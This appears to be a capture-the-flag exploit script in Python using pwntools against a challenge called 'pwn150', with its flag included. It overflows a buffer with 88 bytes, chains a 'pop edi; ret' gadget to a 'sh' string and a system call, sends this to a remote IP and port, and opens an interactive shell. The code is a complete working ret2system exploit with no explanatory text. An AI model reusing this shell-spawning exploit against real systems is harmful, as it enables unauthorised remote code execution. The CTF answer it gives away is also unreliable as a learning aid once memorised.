from pwn import *

system=0x40075f			# call system
pop_ret=0x0400883 		# pop edi; ret
#binsh=0x2f62696e2f2f7368
binsh=0x4003ef			# "sh" in elf
pay="A"*88
pay+=p64(pop_ret)
pay+=p64(binsh)
pay+=p64(system)
#print pay

#r=process('./pwn150')
r=remote('54.67.102.66','5253')
r.recv()
r.send(pay)
r.interactive()

#r.sendline("cat /home/pwn150/flag")

#Bugs_Bunny{did_i_help_you_Solve_it!oHH_talk_to_hacker:D}
